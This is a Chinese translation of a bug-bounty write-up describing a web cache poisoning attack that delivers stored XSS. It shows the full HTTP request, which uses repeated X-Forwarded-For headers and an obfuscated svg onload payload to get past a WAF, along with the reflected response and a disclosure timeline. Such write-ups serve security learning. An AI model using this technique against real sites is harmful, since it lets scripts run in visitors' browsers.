# 我如何通过入侵 CDN 缓存服务器赚到 16500 美元——第二部分

> 原文：<https://infosecwriteups.com/how-i-made-16-500-hacking-cdn-caching-servers-part-2-4995ece4c6e6?source=collection_archive---------1----------------------->

## @bxmbn

![](img/0e9c917ff9ee765e0488c6c45b3afa3b.png)

# 隐藏 XSS 的好方法

> *赏金:2000 美元*

在 Google Dorking 时，我发现了一个特定的 URL，但这次没有被缓存，而是添加了一个可缓存的扩展文件(。js，。css)在 URL 的末尾，它将缓存响应。

现在，我只需要找到一个 XSS。我在一个 Cookie 上找到了一个注入点，但是当我在%20 之后添加任何东西时，WAF 就会被触发

```
Cookie: cookiename=xss</script%20
```

在试图绕过 WAF 时，我意识到我的 IP 也反映在同一个脚本上..

```
guid="</script ","24.99.19.20"
```

由于我的 IP 被反射，我尝试了“X-Forwarded-For”报头，这样我可以关闭

这就是为什么您会看到 3 个“X-Forwarded-For”标题

## 请求:

```
GET /xxx/xx/xxx.xx/x.js?t=2021111121 HTTP/2 
Host: Redacted
X-Forwarded-For: xss 
X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`// X-Forwarded-For: > 
Cookie: gdId=xss</script%20
```

## 回应:

```
...
guid="</script ","24.99.19.20","xss","xss><svg/onload=globalThis[`al`+/ert/.source]`1`//,">
...
```

在用 XSS 毒化了一个 URL 之后，攻击者只需要把它发送给受害者

```
redacted.com/xxx/xx/xxx.xx/x.js?t=2021111121
```

隐藏 XSS·:D 的好方法

这是我最喜欢的缓存中毒，它是在一个公共程序中发现的

【https://hackerone.com/reports/1424094 

# 时间线:

> 上报→2021 年 12 月 11 日
> 
> 分流→2021 年 12 月 14 日
> 
> 悬赏奖金→2022 年 1 月 7 日
> 
> 固定→2022 年 3 月 7 日

# 接下来:

第 3 部分:通过 X-Forwarded-Scheme 头的缓存中毒 DoS

# 🔈 🔈Infosec Writeups 正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有 16 个令人难以置信的演讲者和 10 多个小时充满力量的讨论会议。[查看更多详情并在此注册。](https://iwcon.live/)

[](https://iwcon.live/) [## IWCon2022 - Infosec 书面报告虚拟会议

### 与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…

iwcon.live](https://iwcon.live/)